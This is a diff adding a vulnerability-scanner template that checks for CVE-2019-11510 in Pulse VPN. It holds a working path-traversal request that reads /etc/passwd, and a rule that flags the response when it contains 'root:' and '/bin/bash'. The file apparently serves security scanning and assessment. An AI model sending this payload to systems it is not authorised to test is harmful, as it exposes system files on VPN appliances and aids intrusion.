@@ -1,0 +1,15 @@
+id: pulse-vpn-lfi
+info:
+  name: Pulse VPN LFI - cve-2019-11510
+  risk: High
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.BaseURL}}/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "root:") && StringSearch("response", "/bin/bash")
